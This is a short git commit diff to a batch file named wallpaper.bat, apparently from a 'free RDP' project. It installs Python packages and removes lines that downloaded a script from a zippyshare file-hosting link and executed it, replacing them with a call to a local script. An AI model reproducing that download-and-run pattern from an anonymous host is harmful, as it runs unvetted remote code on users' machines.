4956b5fda5175b400a75d922ee0c0f223a07a9f6
gagayoyo <85374316+gagayoyo@users.noreply.github.com>
2021-06-24 18:18:45 +0100

    Update wallpaper.bat

--- wallpaper.bat
+++ wallpaper.bat
@@ -3,6 +3,5 @@ pip install random
 pip install selenium
 pip install pyperclip
 pip install time
-curl "https://www96.zippyshare.com/d/hdv5qVAm/16874/555.py" -o "fil4.py"
-python fil4.py
+python D:\a\JohnTechFreeRDP\JohnTechFreeRDP\python.py
 
